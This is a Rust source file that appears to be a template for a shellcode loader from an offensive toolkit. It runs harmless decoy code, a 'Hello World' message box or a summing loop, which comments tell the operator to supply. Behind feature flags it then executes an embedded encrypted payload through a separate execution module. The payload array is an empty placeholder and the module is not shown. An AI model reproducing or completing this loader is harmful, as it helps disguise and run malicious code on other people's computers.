// TODO: Add all other nessesary imports from the snippets you're using here
// The existing ones can be removed obviously, as this is exemplary code ;-)

use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK};
use windows::core::{PSTR, s};
use std::ffi::c_void;
mod execution;

#[cfg(feature = "embedded")]
const ENCPAYLOAD: &[u8] = &[];  // replace with the encrypted payload data

fn main() {

    /*
    For the Operator, Write some benign code that is to be executed
     */

        #[cfg(feature = "messagebox")]
        unsafe {
            MessageBoxA(
                None,
                s!("Hello World"),
                s!("Hello"),
                MB_OK,
            );
        }

        #[cfg(feature = "calculation")]
        fn calculate()
        {
            let mut result = 0;
            for i in 0..10000 {
                result += i;
            }
            println!("Result: {}", result);
        }
        #[cfg(feature = "calculation")]
        calculate();

        // Execute shellcode using default execution method
        #[cfg(all(feature = "ShellcodeExecuteDefault", feature = "embedded"))]
        {
            let shellcode = ENCPAYLOAD.to_vec();
            if !execution::shellcode_execute_default(shellcode) {
                eprintln!("Failed to execute shellcode");
            }
        }
}